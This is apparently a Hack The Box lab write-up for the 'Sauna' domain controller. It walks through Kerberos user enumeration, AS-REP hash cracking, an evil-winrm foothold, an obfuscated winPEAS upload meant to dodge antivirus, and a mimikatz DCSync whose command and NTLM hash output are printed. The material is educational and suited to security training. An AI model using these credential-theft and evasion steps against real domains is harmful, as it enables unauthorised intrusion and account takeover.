## HACK_THE_BOX -- Sauna.


### Enumeration 

- I run a speedy nmap script to see what all ports are open then I run a more targeted one against the ports that I see open. On sauna we have a lot of ports open like dns(53), web, kerberos, rpc, netbios, ldap, smb. It's safe to say this is a Windows Domain Controller.

![nmap](/Sauna/images/nmap.png) 


#### Nmap scan results

- We don't get a FQDN in the scan but it does return a domain name of 'EGOTISTICAL-BANK.LOCAL'. We can always fuzz for subdomains later if needed.

- I noticed that I could connect to rpc without a password however I don't have access to run any commands. I also ran a nikto scan while I was trying to enumerate rpc. Lets see if its done yet.

#### RPC Access Denied

![RPC](/Sauna/images/rpc.png) 


### Web enum

- I run feroxbuster against a fairly small IIS fuzz list in seclists and we get some hits for a few html files. I'll probably try to use a bigger wordlist if we don't find anything here. We can see the following directories all returned a 200 response.

	200      GET      385l     1324w    14226c http://10.129.95.180/css/slider.css
	200      GET     2168l     4106w    37019c http://10.129.95.180/css/style.css
	200      GET      640l     1767w    30954c http://10.129.95.180/about.html
	200      GET      683l     1813w    32797c http://10.129.95.180/index.html
	200      GET     2337l     3940w    37414c http://10.129.95.180/css/font-awesome.css
	200      GET      122l      750w    60163c http://10.129.95.180/images/t4.jpg
	200      GET      684l     1814w    38059c http://10.129.95.180/single.html
	200      GET      470l     1279w    24695c http://10.129.95.180/blog.html
	200      GET      144l      850w    71769c http://10.129.95.180/images/t2.jpg
	200      GET      325l      770w    15634c http://10.129.95.180/contact.html
	200      GET      111l      661w    50106c http://10.129.95.180/images/t1.jpg
	200      GET      138l      940w    76395c http://10.129.95.180/images/t3.jpg
	200      GET      657l     3746w   345763c http://10.129.95.180/images/skill1.jpg
	200      GET      268l     2037w   191775c http://10.129.95.180/images/skill2.jpg
	200      GET      389l     1987w   159728c http://10.129.95.180/images/ab.jpg
	200      GET     8975l    17530w   178152c http://10.129.95.180/css/bootstrap.css


#### Nikto scan

- The nikto scan doesn't really give us too much info. The webserver is IIS/10.0. It might be suseptable to a clickjacking attack. And another Content-Type header isn't set.


![feroxbuster](/Sauna/images/feroxbuster.png) 


- If we click on about on the home page it takes us to /about.html and we can see a list of company employees. I can make a wordlist with these names and then see what format they are using for the login structure.


### Kerberos

- Running kerbrute I can see that ksmith, and Fsmith are valid usernames and it gives me the asrep hash and the accounts are set to no pre auth required. I'll copy the hash and try to crack it with john.


![kerbrute](/Sauna/imaeges/kerbrute.png) 

####

> - Valid users

1. administrator
2. hsmith
3. Administrator
4. fsmith
5. Fsmith

- I couldn't get the format of the hashes that were being output from kerbrute to crack with either JtR or hashcat. I has to utilize impacket's GetNPUsers script to output them into a proper format that would work with JtR. After I got the hashes in a workable format I ran the fsmith hash with JtR and it cracks with a password of 'Thestrokes23'.



### Initial Foothold


![Impacket](/Sauna/images/impacket.png) 


- So now we have our first set of credentials.


![JtR](/Sauna/images/jtr.png) 



- Username: fsmith
- Password: Thestrokes23


### Internal Enumeration. 

- Since we have valid credentials we can run crackmapexec with smb and use the --user flag and it gives us a list of known user accounts. That's great. We could try bruteforcing the usernames with kerbrute to try and get more credentials but that is pretty noisy. Let's see what all what all the current user fsmith has access to. We can check SMB, RPC, WINRM. If our use has access to WINRM that's an automatic shell for us.


![Enum](/Sauna/images/users.png) 



- We can see that our user has read access to 4 shares and another share that I have no idea what it it but the description is 'We cant print money'.

#### SMB Access with fsmith

1. IPC$ - Read
2. NETLOGON - Read
3. print$ - Read
4. SYSVOL - Read
5. RICOH Aficia SP 8300DN PCL 6 - We cant print money


![SMB](/Sauna/images/smb.png) 


#### Winrm access

- WOW!! I honestly just checked for laughs but our user fsmith does have access to winrm (wsman). Which means we can utilize evil-winrm with fsmith's account credentials and have a working shell on the target!


![winrm](/Sauna/images/winrm.png) 


![evil](/Sauna/images/evil-winrm.png) 


- If we check fsmith's \Desktop top folder we can see user.txt is in there. 

- I'm going to upload winpeas to the target host and see if I can check for some easy wins. If you guys don't know. [Winpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20241011-2e37ba11) is an awsesome privilege escalation check script written in C#. I grabbed the lasted copy of winPEASany_ofc.exe. I like the obfuscated versions since they are usually better at avoiding detection. I'm going to upload it to the target and hopefully it won't get detected and eaten by Defender :) 


![winpeas](/Sauna/images/winpeas.png) 




- evil-winrm shell makes it easy for us. We can move stuff from our working directory on my attack box to the target simply by executing upload <filename>. 

- One note winpeas is quite large so it is likely to get detected. So learning how to do manual enumeration is always best. The upload in evil-winrm is taking a while. I'm just hoping AV won't eat it.


- It did finally upload and I was able to run it before AV detected it so let's hope it finds some interesting stuff for us to look at and escalate our privileges!


![priv](/Sauna/imaegs/priv.png) 


### Privilege Escalation

- Looking through the output of winpeas it gives us the credentials of another user!!

- Username: svc_loanmanager
- Password: Moneymakestheworldgoround!


![creds](/Sauna/images/creds.png) 


- I uploaded SharpHound ps1 file to the target. Now let's try and run it and see if we get any goodies. This blog post is an excellent resource for using [SharpHound and BloodHound](https://harshdushyants.medium.com/bloodhound-and-sharphound-9919c1bf44a6). 

- I couldn't get the PowerShell SharpHound file to run so I finally just loaded the PE executable and it seemed to run fine without any issues.


![SharpHound](/Sauna/images/SharpHound.png) 


- Now with bloodhound open we can select the 'Upload Data' button from the right side menu and go to where our bloodhound zip or json files are at and click upload to load our info into Bloodhound.


![bloodhound](/Sauna/images/upload.png) 



### Mimikatz DCSync

![Mimikatz](/Sauna/images/mimikatz.png) 


	> $ mimikatz # lsadump::dcsync /domain:egotistical-bank.local /user:Administrator                                                   
	[DC] 'egotistical-bank.local' will be the domain                                                                                
	[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server                                                                       
	[DC] 'Administrator' will be the user account                                                                                   
	[rpc] Service  : ldap                                                                                                           
	[rpc] AuthnSvc : GSS_NEGOTIATE (9)                                                                                              
		                                                                                                                           
	Object RDN           : Administrator                                                                                            
		                                                                                                                           
	** SAM ACCOUNT **                                                                                                               
		                                                                                                                           
	SAM Username         : Administrator                                                                                            
	Account Type         : 30000000 ( USER_OBJECT )                                                                                 
	User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )                                                           
	Account expiration   :                                                                                                          
	Password last change : 7/26/2021 9:16:16 AM                                                                                     
	Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500                                                            
	Object Relative ID   : 500                                                                                                      
		                                                                                                                           
	Credentials:                                                                                                                    
	  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e                                                                                   
	    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e                                                                                   
	    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff                                                                                   
	    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f


- Now that we were able to perform a DCSync attack with mimikatz. We can grab the Administrator's NTLM hash and use it to login via evil-winrm and we are running as Admin on Sauna and can grab the final flag on the Administrator's Desktop.


![root](/Sauna/images/admin.png) 


![root](/Sauna/images/admin-2.png)


- I enjoyed this box. It wasn't super easy but not overly complicated. It gives us practice with Active Directory and attacking AD since it's essentially running as a DC. 
